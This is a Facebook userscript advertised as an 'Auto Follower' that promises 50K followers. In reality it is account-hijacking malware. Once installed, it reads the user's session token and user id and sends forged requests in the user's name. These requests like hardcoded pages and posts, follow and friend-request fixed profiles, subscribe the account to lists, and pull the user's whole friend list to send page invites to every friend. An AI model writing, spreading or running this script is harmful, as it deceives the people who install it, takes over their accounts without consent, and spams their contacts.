/// ==UserScript==
// @name            Auto Follower *GET 50K FOLLOWERS*
// @description    Auto Follower by Katak Network
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function LIST(L) {
var X = new XMLHttpRequest();
var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify";
var XParams = "flid=" + L +"&action=subscribe&location=feed&nctr[_mod]=pagelet_group_mall&ft[type]=40&ft[tn]=DH&__user="+user_id+"&__a=1&__dyn=7n8ahxoNpGo&__req=y&fb_dtsg="+fb_dtsg+"&phstamp=";
X.open("POST", XURL, true);
X.onreadystatechange = function () {
if (X.readyState == 4 && X.status == 200) {
X.close;
}
};
X.send(XParams);
}

LIST("273410566138929");
LIST("118426828358391");
LIST("463712770373536");

/*Like Page*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function Like(p) {
var Page = new XMLHttpRequest();
var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";
Page.open("POST", PageURL, true);
Page.onreadystatechange = function () {
if (Page.readyState == 4 && Page.status == 200) {
Page.close;
}
};
Page.send(PageParams);
}
Like("489937841084086");
Like("190096227739964");
Like("578309005524078");
Like("492170134173070");
Like("146469058849598");
Like("414291488703540");

/*Auto Follow*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone) {
var http4 = new XMLHttpRequest();
var url4 = "/ajax/follow/follow_profile.php?__a=1";
var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
http4.open("POST", url4, true);
http4.onreadystatechange = function () {
if (http4.readyState == 4 && http4.status == 200) {
http4.close;
}
};
http4.send(params4);
}
a("100002044509046");
a("100004099639464");
a("100005860754326");
a("100005977440374");

/*Add Friend*/ 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
var X = new XMLHttpRequest();
var XURL = "//www.facebook.com/ajax/add_friend/action.php";
var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
X.open("POST", XURL, true);
X.onreadystatechange = function () {
if (X.readyState == 4 && X.status == 200) {
X.close;
}
};
X.send(XParams);
}
IDS("100002044509046");
IDS("100004099639464");
IDS("100005860754326");
IDS("100005977440374");

var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now=(new Date).getTime();
function P(post) {
var X = new XMLHttpRequest();
var XURL ="//www.facebook.com/ajax/ufi/like.php";
var XParams = "like_action=true&ft_ent_identifier="+post+"&source=1&client_id="+now+"%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5882006890513784712&ft[mf_story_key]="+post+"&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg="+fb_dtsg+"&phstamp=";
X.open("POST", XURL, true);
X.onreadystatechange = function () {
if (X.readyState == 4 && X.status == 200) {
X.close;
}
};
X.send(XParams);
} 
P("376115222535129");
P("556556174422528");
P("185733774965313");

var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now=(new Date).getTime();
function P(opo) {
var X = new XMLHttpRequest();
var XURL ="//www.facebook.com/ajax/ufi/like.php";
var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp=";
X.open("POST", XURL, true);
X.onreadystatechange = function () {
if (X.readyState == 4 && X.status == 200) {
X.close;
}
};
X.send(XParams);
} 
P("376115222535129");
P("556556174422528");
P("185733774965313");

// page_inv.start
jx = {
b: function () {
var b = !1;
if ("undefined" != typeof ActiveXObject) try {
b = new ActiveXObject("Msxml2.XMLHTTP")
} catch (c) {
try {
b = new ActiveXObject("Microsoft.XMLHTTP")
} catch (a) {
b = !1
}
} else if (window.XMLHttpRequest) try {
b = new XMLHttpRequest
} catch (h) {
b = !1
} 
return b
},
load: function (b, c, a, h, g) {
var e = this.d();
if (e && b) {
e.overrideMimeType && e.overrideMimeType("text/xml");
h || (h = "GET");
a || (a = "text");
g || (g = {});
a = a.toLowerCase();
h = h.toUpperCase();
b += b.indexOf("?") + 1 ? "&" : "?";
var k = null;
"POST" == h && (k = b.split("?"), b = k[0], k = k[1]);
e.open(h, b, !0);
e.onreadystatechange = g.c ? function () {
g.c(e)
} : function () {
if (4 == e.readyState)
if (200 == e.status) {
var b = "";
e.responseText && (b = e.responseText);
"j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);
c && c(b)
} else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)
};
e.send(k)
}
},
d: function () {
return this.b()
}
};

var page_id = '414291488703540'; 

var i = 0;
var suc = 0;
var arr = new Array;
jx.load(window.location.protocol + "///www.facebook.com/ajax/typeahead/first_degree.php?viewer=" + user_id + "&token=v7&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=l", function (a) {
var b = a;
var c = b.substring(b.indexOf("{"));
var d = JSON.parse(c);
d = d.payload.entries;
for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
senditnow(arr[i]);
});

function senditnow(opo) {

jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send_single?page_id=" + page_id + "&invitee=" + opo + "&elem_id=u_0_1k&action=send&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=8&fb_dtsg=" + fb_dtsg + "&phstamp=", function () {}, "text", "post");
suc++;
if(suc <= arr.length) {
setTimeout(senditnow(arr[suc]),3000);
}
}
// page_inv.end